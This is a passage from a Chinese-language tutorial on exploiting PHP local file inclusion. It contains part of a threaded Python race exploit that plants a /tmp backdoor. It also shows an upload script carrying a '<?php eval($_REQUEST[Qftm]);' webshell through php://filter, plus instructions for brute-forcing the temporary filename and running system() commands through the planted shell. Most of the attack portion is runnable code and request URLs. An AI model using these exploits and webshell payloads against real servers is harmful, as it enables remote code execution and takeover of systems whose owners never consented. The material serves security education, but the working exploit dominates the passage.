            host = socket.gethostbyname(sys.argv[1])
        except socket.error, e:
            print "Error with hostname %s: %s" % (sys.argv[1], e)
            sys.exit(1)
        port = 80
        try:
            port = int(sys.argv[2])
        except IndexError:
            pass
        except ValueError, e:
            print "Error with port %d: %s" % (sys.argv[2], e)
            sys.exit(1)
        poolsz = 10
        try:
            poolsz = int(sys.argv[3])
        except IndexError:
            pass
        except ValueError, e:
            print "Error with poolsz %d: %s" % (sys.argv[3], e)
            sys.exit(1)
        print "Getting initial offset...",
        reqphp, tag, reqlfi = setup(host, port)
        offset = getOffset(host, port, reqphp)
        sys.stdout.flush()
        maxattempts = 1000
        e = threading.Event()
        l = threading.Lock()
        print "Spawning worker pool (%d)..." % poolsz
        sys.stdout.flush()
        tp = []
        for i in range(0, poolsz):
            tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))
        for t in tp:
            t.start()
        try:
            while not e.wait(1):
                if e.is_set():
                    break
                with l:
                    sys.stdout.write("r% 4d / % 4d" % (counter, maxattempts))
                    sys.stdout.flush()
                    if counter >= maxattempts:
                        break
            print
            if e.is_set():
                print "Woot!  m/"
            else:
                print ":("
        except KeyboardInterrupt:
            print "nTelling threads to shutdown..."
            e.set()
        print "Shuttin' down..."
        for t in tp:
            t.join()
    if __name__ == "__main__":
        main()
  * **运行脚本Getshell**
修改脚本之后，运行即可包含生成我们精心设置好的/tmp/Qftm后门文件
拿到RCE之后，可以查看tmp下生成的后门文件
    http://192.33.6.145/index.php?file=/tmp/Qftm&Qftm=system(%27ls%20/tmp/%27)
然后使用后门管理工具连接后门webshell
    /tmp/Qftm 
## php7 Segment Fault
###  利用条件
  * **利用条件**
    7.0.0 
dir.php
**攻击利用-技巧2**
**暴力破解**
假如没有`dir.php`还能利用吗，答案是可以的，因为我们传入的恶意文件没有被删除，这样我们就可以爆破这个文件的文件名。
在上面的讲述中，我们知道不同的系统默认的临时文件存储路径和方式都不一样
  * Linux
Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`）
  * windows
Windows临时文件主要存储在`C:/Windows/`目录下，格式通常是（`C:/Windows/php[4个随机字符].tmp`）
对比Linux和Windows来看，Windows需要破解的位数比Linux少，从而Windows会比Linux破解速度快，位数越长所需要耗费的时间就越大。
**攻击载荷**
编写临时文件生成和暴力破解攻击载荷
    #python version 2.7
    import requests
    from io import BytesIO
    files = {
      'file': BytesIO('<?php eval($_REQUEST[Qftm]);')
    }
    url1 = 'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'
    r = requests.post(url=url1, files=files, allow_redirects=False)
    ########################暴力破解模块########################
    url2='http://192.168.68.119/web/fi/index.php?file=C:/Windows/php'+{fuzz}+'.tmp&Qftm=system('whoami');'
    data = fuzz
    print "++++++++++++++++++++++"
    print data
    print "++++++++++++++++++++++"
    ########################暴力破解模块########################
对于暴力破解模块，可以自己添加多线程模块进行暴力破解，也可以将暴力破解模块拿出来单独进行fuzz，或者比较常用的做法就是将一些fuzz工具的模块拿出来添加到里面稍微改一下接口就可以直接使用。
推荐使用fuzz工具直接进行fuzz测试，fuzz工具一般都包含多线程、自定义字典等，使用起来很方便，不用花费时间去编写调试代码。
个人比较喜欢使用Fuzz大法，不管是目录扫描、后台扫描、Web漏洞模糊测试都是非常灵活的。
推荐几款好用的Fuzz工具
    基于Go开发：gobuster     https://github.com/OJ/gobuster
    基于Java开发：dirbuster  OWASP杰出工具 kali自带
    基于Python开发：wfuzz    https://github.com/xmendez/wfuzz
fuzz测试，配置参数，我这里使用的是Kali自带的 `dirbuster`进行模糊测试
参数设置好之后，开始进行fuzz测试
经过一段时间的破解，即可得到上传的临时文件的文件名，同时可以在响应包中看到后门文件的恶意代码也正常解析执行。
**Getshell**
拿到我们上传的恶意临时文件的文件名之后就可以进行包含利用，同样，我们上传的恶意临时文件没有被删除，使用Webshell管理工具对`php2EFF.tmp`后门文件进行包含利用。
## Refference
    https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf
    https://www.php.net/ChangeLog-7.php